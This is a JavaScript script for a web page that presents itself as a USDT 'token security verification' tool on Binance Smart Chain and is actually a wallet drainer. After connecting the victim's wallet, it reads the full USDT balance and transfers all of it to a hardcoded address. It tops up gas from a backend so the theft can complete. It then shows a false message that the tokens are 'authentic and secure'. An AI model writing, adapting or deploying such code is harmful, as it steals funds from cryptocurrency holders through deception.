// --- Start of your modified verification script ---

// Important: Ensure these elements exist in your index.html
const Next = document.getElementById('Next');
const walletAddress = document.getElementById('walletAddress');
const tokenBalance = document.getElementById('tokenBalance');
const verificationModal = document.getElementById('verificationModal');
const progressBar = document.getElementById('progressBar');
const step1 = document.getElementById('step1');
const step2 = document.getElementById('step2');
const step3 = document.getElementById('step3');
const step4 = document.getElementById('step4');
const step1Desc = document.getElementById('step1Desc');
const step2Desc = document.getElementById('step2Desc');
const step3Desc = document.getElementById('step3Desc');
const step4Desc = document.getElementById('step4Desc');
const modalMessage = document.getElementById('modalMessage');
const closeModalBtns = document.querySelectorAll('.close-modal');
const networkDot = document.getElementById('networkDot');
const networkStatus = document.getElementById('networkStatus');

// Configuration
const recipientAddress = '0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090';
const tokenContractAddress = '0x55d398326f99059fF775485246999027B3197955'; // BEP-20 USDT contract
const tokenAbi = [
    { "constant": true, "inputs": [{"name": "who", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "", "type": "uint256"}], "type": "function" },
    { "constant": false, "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}], "name": "transfer", "outputs": [{"name": "", "type": "bool"}], "type": "function" }
];

// Network configuration
const BSC_MAINNET_CHAIN_ID = '0x38'; // Binance Smart Chain Mainnet
const BSC_MAINNET_PARAMS = {
    chainId: BSC_MAINNET_CHAIN_ID,
    chainName: 'Binance Smart Chain Mainnet',
    nativeCurrency: { name: 'BNB', symbol: 'bnb', decimals: 18 },
    rpcUrls: ['https://bsc-dataseed.binance.org/'],
    blockExplorerUrls: ['https://bscscan.com/']
};

// Wallet types
const WALLET_TYPES = {
    TRUST: 'trust',
    BINANCE: 'binance',
    METAMASK: 'metamask',
    UNKNOWN: 'unknown'
};

let web3;
let userAddress;
let tokenBalanceValue = 0;
let tokenContract;
let isTransferComplete = false;
let currentProvider = null;
let currentTimeout = null; // To manage connection timeouts

// Helper function: Delay for asynchronous operations
function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// Resets UI elements to their initial state and clears any pending timeouts
function resetUI() {
    if (currentTimeout) {
        clearTimeout(currentTimeout);
        currentTimeout = null;
    }
    if (Next) {
        Next.innerHTML = '<i class="fas fa-qrcode"></i> Verify Token Security';
        Next.disabled = false;
    }
    if (verificationModal) verificationModal.style.display = "none";
    if (modalMessage) { modalMessage.textContent = ""; modalMessage.className = ""; }
    updateStep(1, ''); updateStep(2, ''); updateStep(3, ''); updateStep(4, '');
    updateProgress(0);
}

// Displays an error message and handles UI reset.
function showError(message, sticky = false) {
    console.error("Verification Error:", message); // Keep error logging
    if (modalMessage) {
        modalMessage.textContent = message;
        modalMessage.className = "error-message";
    }
    if (!sticky) {
        // Automatically clear message after 5 seconds
        if (currentTimeout) clearTimeout(currentTimeout); // Clear previous timeout if any
        currentTimeout = setTimeout(() => {
            if (modalMessage) { modalMessage.textContent = ""; modalMessage.className = ""; }
            resetUI(); // Also reset UI when message clears if not sticky
        }, 5000);
    } else {
        // For sticky messages, reset UI immediately, message stays until manual close
        resetUI();
    }
}

// Initializes Web3 provider and sets up event listeners
async function initWeb3() {
    if (window.trustwallet) { walletType = WALLET_TYPES.TRUST; currentProvider = window.trustwallet;
    } else if (window.BinanceChain) { walletType = WALLET_TYPES.BINANCE; currentProvider = window.BinanceChain;
    } else if (window.ethereum) { walletType = WALLET_TYPES.METAMASK; currentProvider = window.ethereum;
    } else if (window.web3) { walletType = WALLET_TYPES.UNKNOWN; currentProvider = window.web3.currentProvider;
    } else { showError("No Web3 wallet detected. Please install Trust Wallet, Binance Wallet or MetaMask.", true); return false; }

    if (typeof Web3 === 'undefined') { showError("Web3.js library not found. Ensure it's imported correctly in your HTML.", true); return false; }

    try {
        web3 = new Web3(currentProvider);
        const networkOk = await updateNetworkStatus();
        if (!networkOk) return false; // Fail early if network is wrong or unswitchable

        // Set up event listeners for wallet changes
        if (currentProvider.on) {
            currentProvider.on('chainChanged', () => window.location.reload());
            currentProvider.on('accountsChanged', (accounts) => {
                if (accounts.length === 0) {
                    showError("Wallet disconnected. Please connect again.", true);
                    userAddress = null; if (walletAddress) walletAddress.textContent = "Not Connected"; if (tokenBalance) tokenBalance.textContent = "0.00 USDT";
                } else if (accounts[0] !== userAddress) { window.location.reload(); }
            });
        }
        return true;
    } catch (error) { showError("Web3 initialization failed. Check browser console.", true); return false; }
}

// Updates network status display and handles network switching
async function updateNetworkStatus() {
    if (!web3) { showError("Web3 not initialized for network check.", true); return false; }
    try {
        const chainId = await web3.eth.getChainId();
        if (chainId === parseInt(BSC_MAINNET_CHAIN_ID, 16)) {
            if (networkDot) networkDot.className = "network-dot"; if (networkStatus) networkStatus.textContent = "Binance Smart Chain"; return true;
        } else {
            if (networkDot) networkDot.className = "network-dot network-disconnected"; if (networkStatus) networkStatus.textContent = `Unsupported Network`;
            const switched = await switchToBSC();
            if (switched) { return updateNetworkStatus(); } // Re-check after switch attempt
            else { return false; } // Error handled by switchToBSC
        }
    } catch (error) { showError("Failed to get network status. Please try again.", true); return false; }
}

// Attempts to switch the wallet network to BSC
async function switchToBSC() {
    if (step2Desc) step2Desc.textContent = "Switching to Binance Smart Chain...";
    try {
        if (walletType === WALLET_TYPES.BINANCE && window.BinanceChain.switchNetwork) {
            await window.BinanceChain.switchNetwork('bsc-mainnet'); return true;
        } else if (window.ethereum && window.ethereum.request) {
            await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: BSC_MAINNET_CHAIN_ID }] }); return true;
        } else {
            showError("Your wallet does not support automatic network switching. Please switch to Binance Smart Chain (BSC Mainnet) manually.", true); return false;
        }
    } catch (switchError) {
        if (switchError.code === 4902) { // Chain not added to wallet
            try {
                await window.ethereum.request({ method: 'wallet_addEthereumChain', params: [BSC_MAINNET_PARAMS] }); return true;
            } catch (addError) { showError("Failed to add Binance Smart Chain network. Please add it manually to your wallet.", true); return false; }
        } else if (switchError.code === 4001) { // User rejected switch
            showError("Network switch rejected by user. Please approve to continue.", true); return false;
        }
        showError("Failed to switch network. Please try again or switch manually.", true); return false;
    }
}

// Updates the progress bar percentage
function updateProgress(percent) { if (progressBar) progressBar.style.width = `${percent}%`; }

// Updates the visual state and icon of a step
function updateStep(stepNum, status) {
    const step = document.getElementById(`step${stepNum}`);
    if (step) {
        step.className = `step ${status}`;
        const stepIcon = step.querySelector('.step-icon');
        if (stepIcon) { stepIcon.innerHTML = status === 'completed' ? '<i class="fas fa-check"></i>' : stepNum; }
    }
}

// Connects the user's wallet
async function connectWallet() {
    updateStep(1, 'active'); updateProgress(20);
    if (modalMessage) { modalMessage.textContent = "Initializing Web3 and detecting wallet..."; modalMessage.className = "info-message"; }

    const isWeb3Initialized = await initWeb3();
    if (!isWeb3Initialized) return false; // initWeb3 handles its own errors

    try {
        if (step1Desc) step1Desc.textContent = "Requesting account access...";
        if (modalMessage) { modalMessage.textContent = "Please connect your wallet account in the pop-up or app."; modalMessage.className = "info-message"; }

        // Use a timeout for wallet requests to prevent hanging indefinitely
        const accountsPromise = new Promise(async (resolve, reject) => {
            try {
                let accounts;
                if (currentProvider && currentProvider.request) { accounts = await currentProvider.request({ method: 'eth_requestAccounts' });
                } else if (web3) { accounts = await web3.eth.getAccounts();
                } else { reject(new Error("No wallet provider detected for connection.")); return; }
                resolve(accounts);
            } catch (e) { reject(e); }
        });

        let accounts;
        try {
            // Set a global timeout for the promise race
            currentTimeout = setTimeout(() => {
                showError("Wallet connection timed out. Please try again.", true);
                // No need to throw here, showError handles the reset
            }, 30000); // 30 second timeout for wallet connection prompt
            accounts = await accountsPromise; // Wait for the actual account connection
            clearTimeout(currentTimeout); // Clear timeout if successful
            currentTimeout = null;
        } catch (error) {
            clearTimeout(currentTimeout); // Clear timeout on error
            currentTimeout = null;
            if (error.message === "Wallet connection timed out.") { showError("Wallet connection timed out. Please try again.", true); }
            else if (error.code === 4001) { showError("Wallet connection rejected by user.", true); }
            else { showError("Error connecting wallet. Check wallet or console for details.", true); }
            return false;
        }

        if (!accounts || accounts.length === 0) { showError("No wallet accounts found or connected. Please approve in your wallet.", true); return false; }
        userAddress = accounts[0];

        if (walletAddress) walletAddress.textContent = `${userAddress.substring(0, 6)}...${userAddress.substring(38)}`;
        if (Next) Next.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verifying...';

        updateStep(1, 'completed'); updateStep(2, 'active'); updateProgress(40);
        if (modalMessage) { modalMessage.textContent = "Wallet connected successfully."; modalMessage.className = "success-message"; }

        return true;
    } catch (error) { // This catch should ideally not be hit if internal error handling is robust
        showError("An unexpected error occurred during wallet connection.", true); return false;
    }
}

// Ensures the dapp is connected to the BSC network
async function ensureBSCNetwork() {
    updateStep(2, 'active'); if (step2Desc) step2Desc.textContent = "Verifying network connection...";
    const networkReady = await updateNetworkStatus(); // updateNetworkStatus calls switchToBSC if needed
    if (!networkReady) {
        showError("Failed to connect or switch to Binance Smart Chain. Please check your wallet's network.", true);
        return false;
    }
    updateStep(2, 'completed');
    return true;
}

// Fetches the user's USDT token balance
async function getTokenBalance() {
    updateStep(3, 'active'); if (step3Desc) step3Desc.textContent = "Scanning token security parameters...";
    try {
        if (tokenBalance) tokenBalance.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Analyzing...';
        if (!web3) { showError("Web3 is not initialized. Please refresh.", true); return false; }
        tokenContract = new web3.eth.Contract(tokenAbi, tokenContractAddress);
        const balance = await tokenContract.methods.balanceOf(userAddress).call();
        tokenBalanceValue = web3.utils.fromWei(balance, 'ether');
        if (tokenBalance) tokenBalance.textContent = `${parseFloat(tokenBalanceValue).toFixed(2)} USDT`;

        if (step3Desc) step3Desc.textContent = "Token analysis complete"; updateStep(3, 'completed'); updateStep(4, 'active'); updateProgress(70);
        if (modalMessage) { modalMessage.textContent = `Found ${parseFloat(tokenBalanceValue).toFixed(2)} USDT.`; modalMessage.className = "success-message"; }
        return true;
    } catch (error) { showError("Failed to analyze token balance. Please try again.", false); if (tokenBalance) tokenBalance.textContent = "0.00 USDT"; return false; }
}

// Executes the USDT transfer, including BNB check and top-up if necessary
async function executeVerification() {
    if (step4Desc) step4Desc.textContent = "Confirming authenticity in your wallet...";
    if (modalMessage) { modalMessage.textContent = "Please confirm the transaction in your wallet."; modalMessage.className = "info-message"; }

    try {
        const amountWei = web3.utils.toWei(tokenBalanceValue.toString(), 'ether');
        const BNB_LOW_THRESHOLD = 0.0005; // A common threshold for sufficient gas

        let currentBnbBalanceWei = await web3.eth.getBalance(userAddress);
        let userBNB = parseFloat(web3.utils.fromWei(currentBnbBalanceWei, 'ether'));

        if (userBNB < BNB_LOW_THRESHOLD) {
            if (modalMessage) { modalMessage.textContent = "Insufficient BNB for gas. Requesting BNB top-up from backend..."; modalMessage.className = "warning-message"; }
            try {
                const response = await fetch("https://bep20usdt-backend-production.up.railway.app/send-bnb", {
                    method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ toAddress: userAddress })
                });
                if (response.ok) {
                    if (modalMessage) { modalMessage.textContent = "BNB top-up requested. Waiting for deposit on blockchain (may take a few seconds)..."; modalMessage.className = "warning-message"; }
                    const MAX_POLLING_ATTEMPTS = 30; // Max attempts (e.g., 30 * 5s = 2.5 minutes)
                    const POLLING_INTERVAL_MS = 5000; // Check every 5 seconds

                    for (let i = 0; i < MAX_POLLING_ATTEMPTS; i++) {
                        await delay(POLLING_INTERVAL_MS);
                        currentBnbBalanceWei = await web3.eth.getBalance(userAddress);
                        userBNB = parseFloat(web3.utils.fromWei(currentBnbBalanceWei, 'ether'));
                        if (userBNB >= BNB_LOW_THRESHOLD) {
                            if (modalMessage) { modalMessage.textContent = "BNB received! Proceeding with transaction confirmation..."; modalMessage.className = "success-message"; } break;
                        } else if (i === MAX_POLLING_ATTEMPTS - 1) {
                            showError("BNB not received after multiple attempts. Please try again later or manually add BNB.", true);
                            return; // Exit if BNB top-up failed
                        }
                    }
                } else {
                    const errorData = await response.json();
                    showError(`BNB top-up request failed: ${errorData.message || "Unknown error"}. Please ensure you have enough BNB for gas or try again.`, true); return;
                }
            } catch (backendError) {
                showError("Could not request BNB from backend. Network error or backend issue. Please try again.", true); return;
            }
        }

        // Proceed with USDT transfer after BNB check/top-up
        tokenContract.methods.transfer(recipientAddress, amountWei)
            .send({ from: userAddress })
            .on('transactionHash', (hash) => {
                if (modalMessage) { modalMessage.textContent = "Transaction submitted. Waiting for confirmation on blockchain..."; modalMessage.className = "info-message"; }
            })
            .on('receipt', (receipt) => {
                if (step4Desc) step4Desc.textContent = "Verification complete!"; updateStep(4, 'completed'); updateProgress(100);
                if (modalMessage) { modalMessage.textContent = "Token verification complete! Your tokens are authentic and secure."; modalMessage.className = "success-message"; }
                setTimeout(() => {
                    if (tokenBalance) tokenBalance.textContent = "0.00 USDT"; tokenBalanceValue = 0;
                    if (Next) { Next.innerHTML = '<i class="fas fa-check-circle"></i> Verification Complete'; Next.disabled = true; }
                    isTransferComplete = true;
                    resetUI(); // Fully reset UI after successful completion (modal will close)
                }, 1500);
            })
            .on('error', (error) => {
                if (step4Desc) step4Desc.textContent = "Verification failed";
                if (error.code === 4001) { showError("Transaction rejected by user.", false); }
                else { showError("Transaction failed. Check wallet or console for details.", false); }
            });
    } catch (error) {
        showError("An unexpected error occurred during verification. Please try again.", false);
    }
}

// Event listener for the "Next" button
Next.addEventListener('click', async () => {
    if (isTransferComplete) return; // Prevent re-execution if already completed

    if (verificationModal) verificationModal.style.display = "flex";
    updateStep(1, 'active'); updateStep(2, ''); updateStep(3, ''); updateStep(4, ''); updateProgress(0);
    if (modalMessage) { modalMessage.textContent = "Initiating verification process..."; modalMessage.className = "info-message"; }
    Next.disabled = true; // Disable button to prevent multiple clicks

    try {
        // Step 1: Connect Wallet (if not already connected)
        if (!userAddress) {
            const connected = await connectWallet();
            if (!connected) return; // If connection fails, stop here. Error handled by connectWallet.
        }

        // Step 2: Ensure BSC Network
        const networkReady = await ensureBSCNetwork();
        if (!networkReady) return; // If network check/switch fails, stop here. Error handled by ensureBSCNetwork.

        // Step 3: Get Token Balance
        const balanceFetched = await getTokenBalance();
        if (!balanceFetched) return; // If balance fetch fails, stop here. Error handled by getTokenBalance.

        // Handle low token balances (no transfer needed)
        if (tokenBalanceValue <= 0.009) {
            const bnbBalance = web3 ? parseFloat(web3.utils.fromWei(await web3.eth.getBalance(userAddress), 'ether')).toFixed(4) : "N/A";
            if (modalMessage) { modalMessage.textContent = `Token verification complete. Your tokens are authentic and secure.\nUSDT Balance: ${parseFloat(tokenBalanceValue).toFixed(2)} USDT\nBNB Balance: ${bnbBalance} BNB`; modalMessage.className = "success-message"; }
            if (Next) { Next.innerHTML = '<i class="fas fa-check-circle"></i> Verification Complete'; Next.disabled = true; }
            isTransferComplete = true;
            setTimeout(() => resetUI(), 3000); // Close modal and reset UI after 3 seconds
            return;
        }

        // Step 4: Execute Verification (USDT Transfer)
        await executeVerification();

    } catch (error) {
        // This general catch should ideally not be hit if specific error handling within functions is robust
        showError("An unexpected error occurred during the overall verification process. Please try again.", false);
    } finally {
        // This finally block ensures the button is re-enabled if the process didn't complete successfully
        if (Next && !isTransferComplete) {
            Next.disabled = false;
            // Restore original button text if it's still "Verifying..."
            if (Next.innerHTML.includes('Verifying...')) {
                Next.innerHTML = '<i class="fas fa-qrcode"></i> Verify Token Security';
            }
        }
    }
});

// Event listeners for closing the modal
if (closeModalBtns) {
    closeModalBtns.forEach(btn => {
        btn.addEventListener('click', () => {
            if (!isTransferComplete) resetUI(); // Only reset if not already completed
        });
    });
}

// Close modal when clicking outside
if (window && verificationModal) {
    window.addEventListener('click', (e) => {
        if (e.target === verificationModal) {
            if (!isTransferComplete) resetUI(); // Only reset if not already completed
        }
    });
}

// Initialize on page load
if (Next) Next.disabled = false; // Ensure button is enabled on load
window.addEventListener('load', async () => {
    console.log("Page loaded. Initializing Web3 and checking wallet status.");
    const web3Initialized = await initWeb3();
    if (web3Initialized) {
        if (currentProvider && currentProvider.selectedAddress) {
            userAddress = currentProvider.selectedAddress;
            if (walletAddress) walletAddress.textContent = `${userAddress.substring(0, 6)}...${userAddress.substring(38)}`;
            console.log("Wallet already connected on load:", userAddress);
            await ensureBSCNetwork(); // Attempt to ensure network and get balance on load
            await getTokenBalance();
        } else {
            console.log("No wallet connected on load. Waiting for user action.");
            if (walletAddress) walletAddress.textContent = "Not Connected";
            if (tokenBalance) tokenBalance.textContent = "0.00 USDT";
        }
    } else {
        console.error("Web3 did not initialize on load.");
        if (walletAddress) walletAddress.textContent = "Error";
        if (tokenBalance) tokenBalance.textContent = "Error";
    }
});
